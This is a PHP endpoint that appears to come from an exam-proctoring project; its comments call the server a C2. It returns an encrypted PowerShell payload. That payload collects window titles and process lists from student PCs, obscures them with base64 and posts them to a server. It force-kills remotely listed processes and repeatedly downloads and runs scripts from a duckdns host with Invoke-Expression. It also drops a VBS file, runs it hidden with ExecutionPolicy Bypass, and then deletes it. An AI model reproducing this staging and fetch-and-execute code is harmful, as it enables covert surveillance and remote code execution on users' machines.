<?php
require_once("Fernet/Fernet.php");

use Fernet\Fernet;

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    if (isset($data['encrypted_key'])) {
                $ca_key_passphrase = getenv('CA_KEY_PASSPHRASE');
                if (!$ca_key_passphrase) {
                        error_log('CA key passphrase environment variable is not set.');
                }
        // Load the CA private key
                $ca_private_key = file_get_contents("/var/www/keys/private_rsa.key");
                if (!$ca_private_key) {
                        error_log('Failed to read CA private key.');
                }

                // Parse the CA private key
                $RSA_privatekey = openssl_pkey_get_private($ca_private_key, $ca_key_passphrase);
                if (!$RSA_privatekey) {
                        error_log('Failed to parse CA private key: ' . openssl_error_string());
                }

        // Decrypt Fernet key with C2 private key
        $encrypted_fernet_key = base64_decode($data['encrypted_key']);
        $fernet_key = '';
        if (!openssl_private_decrypt($encrypted_fernet_key, $fernet_key, $RSA_privatekey)) {
            echo "Failed to decrypt Fernet key";
            exit;
        }

        // Encrypt the PowerShell script with the Fernet key
        $fernet = new Fernet($fernet_key);
        $powershell_script = <<<'EOT'
# Define proctoring functions into a variable to use it in background jobs
$functions = {
    #---------------------------------------------------------------------------------------------------------------------
    #                                                      Basic Functions
    #---------------------------------------------------------------------------------------------------------------------
    # Function: Determine if Raspberry Pi is connected to the PC
    # Finding for USB with VID 1D6B. VID is the Vendor ID set by us when configuring composite mode on Raspberry Pi
    function Is_Connected{
        $check = $null
        $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }

        if( $null -ne $check){
            return 'FOUND'
        }
    }

    #Function: Encoding plaintext string to base64 encode so that the proctoring results is not so obvious when sending to flaskserver
    function Encode($data){
        return [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($data))
    }
    #---------------------------------------------------------------------------------------------------------------------
    #                                                     Heartbeat Functions
    #---------------------------------------------------------------------------------------------------------------------
    #Sending heartbeat to webserver to signify that 'I am still connected'
    #It will be using the unique MAC address to differentiate the different devices

    function Send_HeartBeat{
        # Check if UUID is already generated, if not, generate it
        if (-not $uuid) {
            Write-Host "Generating UUID"
            $pub_key = Invoke-WebRequest -Uri $key -UseBasicParsing
            $key_data = @{ PuK = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($pub_key.ToString()))}
            try {
                $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($key_data | ConvertTo-Json) -ContentType 'application/json'
                $uuid = ($response.Content | ConvertFrom-Json).uuid
            } catch {
                Write-Error "Failed to generate UUID: $_"
                return
            }
        } else {}
        while(1){
            if (Is_Connected -ne $null){
                $url = $heartbeat + 'uuid=' + $uuid
                Write-Host "Url =" $url
                Write-Host "uuid =" $uuid
                Invoke-WebRequest -Uri $url -UseBasicParsing
                Start-Sleep -s 5
            }
            else{break}
        }
    }

    #---------------------------------------------------------------------------------------------------------------------
    #                                                      Proctoring Functions
    #---------------------------------------------------------------------------------------------------------------------
    # Function: Display process name and the mainwindowtitle of the current active Windows.
    # Add-Type (cmdlet): Allows the definition of a Microsoft .NET Core class in Powershell session, we can then instantiate objects, by using the New-Object cmdlet and use the objects
    # Public class APIFuncs: contains three static methods that utilizes the user32.dll functions GetWindowText, GetForegroundWindow and GetWindowTextLength
    function Get_Active_Win{
        Add-Type  @'
        using System;
        using System.Runtime.InteropServices;
        using System.Text;

        public class APIFuncs
        {
            [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
                public static extern int GetWindowText(IntPtr hwnd,StringBuilder lpString, int cch);

            [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern IntPtr GetForegroundWindow();

            [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)]
                public static extern Int32 GetWindowTextLength(IntPtr hWnd);
            }
'@
            while(1){
                # After calling Add-Type, we can freely use the called Windows API
                # The two colon '::' idicates that we are calling a static .NET method
                if (Is_Connected -ne $null){
                    $w = [APIFuncs]::GetForegroundWindow()
                    $len = [APIFuncs]::GetWindowTextLength($w)
                    $sb = New-Object text.stringbuilder -ArgumentList ($len + 1)
                    $rtnlen = [APIFuncs]::GetWindowText($w,$sb,$sb.Capacity)

                    if ([string]::IsNullOrEmpty($sb.ToString())){$sb = 'No Active Window'} # Checking for active window

                    $completed = $false
                    #Sending JSON data to Flask server: By taking advantage of the POST request
                    $data = @{AWD = Encode($($sb.tostring()))}

                    while (-not $completed){
                        try{
                            $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'
                            #Sending data to Webserver
                            Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
                            $completed = $true
                        }catch{}
                    }
                    #Retrieving interval
                    $tag = Encode('AWD')
                    $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
                    $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
                    Start-Sleep -s $delay.content

                }
                else{break}
            }
    }

    # Function: Display a list of all the opened windows on the Student's PC
    function Get_Open_Win{
        while(1){
            if (Is_Connected -ne $null){
                $Windows =  Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object MainWindowTitle

                $list = New-Object Collections.Generic.List[String]
                foreach($windows in $Windows){
                    $encoded = Encode($windows.MainWindowTitle.tostring())
                    $list.Add($encoded)
                }

                $completed = $false
                #Sending JSON data to Flask server: By taking advantage of the POST request
                $data = @{OW = $list}

                while (-not $completed){
                    try{
                        $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'

                        #Sending data to Webserver
                        Invoke-WebRequest -Uri $sending_list_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
                        $completed = $true
                    }catch{}
                }
                #Retrieving interval
                $tag = Encode('OW')
                $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
                $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
                Start-Sleep -s $delay.content
            }
            else{break}
        }
    }

    # Function: Display properties of connected monitors in Students PC.
    function Get_Display_Prop{
        while(1){
            if (Is_Connected -ne $null){
                $Monitors = (Get-CimInstance -Namespace root\wmi -ClassName WmiMonitorBasicDisplayParams | Where-Object {$_.Active -like 'True'}).Active.Count

                $completed = $false
                #Sending data to Flask server: By taking advantage of the POST request
                $data = @{AMD = Encode($($Monitors.tostring()))}

                while (-not $completed){
                    try{
                        $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'

                        #Sending data to Webserver
                        Invoke-WebRequest -Uri $sending_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
                        $completed = $true
                    }catch{}
                }
                #Retrieving interval
                $tag = Encode('AMD')
                $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
                $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
                Start-Sleep -s $delay.content
            }
            else{break}
        }
    }

    # Function: Display a list of all the processes running
    function Get_Proc_List{
        while(1){
            Write-Host "Get Process Start"
            if (Is_Connected -ne $null){
                $Process = Get-Process | Group-Object ProcessName | Select-Object Name

                $list = New-Object Collections.Generic.List[String]
                foreach($process in $Process){
                    $encoded = Encode($process.name.tostring())
                    $list.Add($encoded)
                }

                $completed = $false
                #Sending data to Flask server: By taking advantage of the POST request
                $data = @{PL = $list}

                while (-not $completed){
                    try{
                        $response = Invoke-WebRequest -Uri $base_url -Method POST -Body ($data|ConvertTo-Json) -ContentType 'application/json'

                        #Sending data to Webserver
                        Invoke-WebRequest -Uri $sending_list_base -UseBasicParsing -Method POST -Body ($response.content|ConvertTo-Json) -ContentType 'application/json'
                        $completed = $true
                    }catch{}
                }
                #Retrieving interval
                $tag = Encode('PL')
                $url = ($interval_base + 'uuid=' + $uuid + '&category=' + $tag)
                $delay = Invoke-WebRequest -Uri $url -UseBasicParsing
                Start-Sleep -s $delay.content
            }
            else{break}
            Write-Host "Get Process End"
        }
    }
}

#---------------------------------------------------------------------------------------------------------------------
#                                                    Background Jobs Activation
#---------------------------------------------------------------------------------------------------------------------

# Start the process killing job
$killProcessJob = Start-Job -ScriptBlock {
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")

    function Kill_Processes {
        $defaultProcessesToKill = @('calculatorapp', 'discord')
        $invigilatorProcessesToKill = (Invoke-WebRequest -Uri $processes_url -UseBasicParsing).Content -split ','

        $processesToKill = $defaultProcessesToKill + $invigilatorProcessesToKill

        foreach ($process in $processesToKill) {
            $trimmedProcess = $process.Trim()
            if ($trimmedProcess) {
                try {
                    Get-Process -Name $trimmedProcess -ErrorAction SilentlyContinue | Stop-Process -Force
                } catch {
                    Write-Output "Failed to kill process: $trimmedProcess"
                }
            }
        }
    }

    function Is_Connected {
        $check = $null
        $check = Get-PnpDevice -PresentOnly | Where-Object { $_.InstanceId -match '^USB\\VID_1D6B' }

        if ($null -ne $check) {
            return 'FOUND'
        } else {
            return $null
        }
    }

    while ($true) {
        if (Is_Connected -ne $null) {
            Kill_Processes
            Start-Sleep -Seconds 5
        } else {
            break
        }
    }
}

$heartbeat = Start-Job -InitializationScript $functions -ScriptBlock{
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
    Send_HeartBeat}
Start-Sleep 2
$job1 = Start-Job -InitializationScript $functions -ScriptBlock{
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
    Get_Active_Win}
Start-Sleep 2
$job2 = Start-Job -InitializationScript $functions -ScriptBlock{
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
    Get_Display_Prop}
Start-Sleep 2
$job3 = Start-Job -InitializationScript $functions -ScriptBlock{
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
    Get_Proc_List}
Start-Sleep 2
$job4 = Start-Job -InitializationScript $functions -ScriptBlock{
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/config.ps1")
    Invoke-Expression (New-Object System.Net.WebClient).DownloadString("https://rapid.tlnas.duckdns.org/uploads/functions.ps1")
    Get_Open_Win}
Start-Sleep 2

# Function: Download the VBS file content from the C2 server
function Get-VBSContent {
    try {
        $vbs_content = Invoke-WebRequest -Uri $vbs_url -UseBasicParsing
        Write-Host "Downloaded VBS file content."
        return $vbs_content
    } catch {
        Write-Host "Failed to download VBS file content: $_"
        exit
    }
}

# Function: Execute the VBS content in memory
function Execute-VBSContent {
    param ($vbsContent)
    try {
        # Replace placeholders with actual values from PowerShell environment variables
        $vbsContent = $vbsContent -replace "\{\{BASE_URL\}\}", $base_url `
                                   -replace "\{\{KEY\}\}", $key `
                                   -replace "\{\{SENDING_BASE\}\}", $sending_base

        $tempVbsFilePath = [System.IO.Path]::GetTempFileName() + ".vbs"
        Set-Content -Path $tempVbsFilePath -Value $vbsContent

        # Execute the VBS script using cscript.exes
        $command = "cscript.exe //B `"$tempVbsFilePath`""
        $null = Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"& {Start-Sleep -Seconds 5; Remove-Item -Path `"$tempVbsFilePath`" -Force}`"" -WindowStyle Hidden

        Write-Host "Executing VBS file..."
        Start-Process -FilePath "cscript.exe" -ArgumentList "//B `"$tempVbsFilePath`"" -WindowStyle Hidden
    } catch {
        Write-Host "Failed to execute VBS content: $_"
        exit
    }
}

# Download the VBS file content
$vbs_content = Get-VBSContent
# Execute the VBS content
Execute-VBSContent -vbsContent $vbs_content
EOT;
        $encrypted_functions_script = $fernet->encode($powershell_script);

        // Prepare the response
        $response = [
            'encrypted_functions_script' => base64_encode($encrypted_functions_script)
        ];

        // Send the response back to the Student PC
        header('Content-Type: application/json');
        echo json_encode($response);
    } else {
        http_response_code(400);
        echo json_encode(["error" => "Key not provided"]);
    }
} else {
    http_response_code(405); // Method Not Allowed
    echo json_encode(["error" => "Only POST method is allowed"]);
}
?>